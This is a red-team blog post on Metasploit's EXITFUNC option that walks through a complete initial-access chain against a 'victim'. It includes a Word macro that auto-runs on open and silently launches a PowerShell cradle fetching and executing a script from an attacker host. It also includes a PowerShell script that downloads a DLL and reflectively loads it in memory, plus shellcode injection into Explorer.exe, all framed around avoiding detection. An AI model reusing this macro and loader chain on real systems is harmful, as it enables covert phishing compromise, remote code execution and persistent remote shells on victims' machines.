---
title: EXITFUNC Thread in Metasploit
classes: wide
header: '{"teaser":"/assets/images/2023-12-29-EXITFUNC in Metasploit/20231229133245411.png"}'
ribbon: Red
excerpt: Exploring the benefits of using Exitfunc thread in Metasploit
description: Exploring the benefits of using Exitfunc thread in Metasploit
categories:
  - MalwareDev
toc: true
toc_sticky: true
toc_label: About This Post
toc_icon: book
tags:
  - ProcessInjection
  - Macro
  - ReflectiveLoad
---
<br>
# EXITFUNC Thread in Metasploit 

In Metasploit, the EXITFUNC option is used to specify the method that the payload should use when exiting or cleaning up after exploitation. This option is relevant when you're using a payload that creates a separate thread or process on the target system. 

We will talk about the difference between **`thread`** and **`process`** for EXITFUNC in Metasploit is the termination behavior after the payload has been executed.

-  **Thread:** When EXITFUNC is set to thread, the payload terminates the thread in which it is executed using the ExitThread call. This option is often used for stealthier operations, as the malicious code runs within the context of an existing process.

```
set EXITFUNC thread
```

-  **Process:** By default the value of EXITFUNC is set to "Process". When EXITFUNC is set to process, the payload terminates the process in which it is executed using the ExitProcess call. This results in the termination of the entire process, including any other threads or payloads running within it. 

```
set EXITFUNC process
```

# Case scenario using Thread:

Suppose we're trying to gain initial access from the target victim. We will perform a few techniques to make our payload live stealthy way and to avoid the Word document closing when te shellcode exits.

- Process injection (Explorer.exe) via DLL
- Powershell download cradle and Reflective Load in memory
- Macro

## Generating Payload

To generate a payload in C# format with the **`EXITFUNC=thread`** option using **`msfvenom`**, you can use the following command:

![trick](/assets/images/2023-12-29-EXITFUNC Thread in Metasploit/20231229135728113.png)

## Process Injection 

Let's open the process we want to inject into, which is **Explorer.exe** in this case. Next, we need to allocate memory in the target process to store our shellcode.

![trick](/assets/images/2023-12-29-EXITFUNC Thread in Metasploit/20231229135656900.png)

We don't want to to deliver our executable file to victim, we will perform DLL injection with C#. By compiled, we got our Injector.dll.

![trick](/assets/images/2023-12-29-EXITFUNC Thread in Metasploit/20231229141506691.png)

## Reflective Load in Memory

It will loads a DLL using the reflective loading technique, which means that the DLL is loaded directly into memory without being saved to disk. Saving the below powershell script into a file.

```powershell
$scrpit = (New-Object System.Net.WebClient).DownloadData('http://192.168.19.134/Injector.dll')
$assembly = [System.Reflection.Assembly]::Load($script)
$class = $assembly.GetType("Loader.Program")
$method = $class.GetMethod("Runner")
$method.Invoke(0, $null)
```

## Macro with AutoOpen Document

A macro with **AutoOpen** Document is a feature in Microsoft Word that automatically executes a macro when victim open a document and click on **enable content**.

```vb
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.19.134/update.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

Let's start our HTTP server for hosting our Powershell script and dll files. Moreover, let's configure our Metasploit multi-handler with the EXITFUC thread.

![trick](/assets/images/2023-12-29-EXITFUNC Thread in Metasploit/20231229142749223.png)

## Catching the shell

Once the victim clicks enable content on the Word document, it will attempt to download our Powershell script and load the dll in memory.

![trick](/assets/images/2023-12-29-EXITFUNC Thread in Metasploit/20231229143329219.png)

We can see that our Meterpreter is running inside **Explorer.exe**. By this even if the victim closed the Word document, our shell is still alive.

![trick](/assets/images/2023-12-29-EXITFUNC Thread in Metasploit/20231229145059914.png)

# Benefit our using Thread:

If you want to exit your meterpreter session or if it dies for some reason, it won't terminate the explorer.exe process, which may cause the victim to notice a black screen pop up. 

![trick](/assets/images/2023-12-29-EXITFUNC Thread in Metasploit/2023-12-29 15-53-30.gif)

If we choose to use the Process instead of the Thread, it may cause the victim to notice a black screen pop up or the home screen to hang for a moment due to the explorer.exe process restart. It's important to consider the OPSEC on the victim's system when deciding which method to use.

You can notice that the process **Explorer.exe** will change due to it restarted the process.

![trick](/assets/images/2023-12-29-EXITFUNC Thread in Metasploit/2023-12-29 15-50-14.gif) 

# Conclusion

In conclusion, understanding the difference between threads and processes when it comes to Exitfunc in Metasploit is crucial for effective exploitation and post-exploitation activities.

The choice between using a **thread-based** or **process-based** Exitfunc in Metasploit depends on the specific scenario and desired outcome. It is crucial to carefully consider each option to ensure successful exploitation and post-exploitation activities while minimizing the risk of detection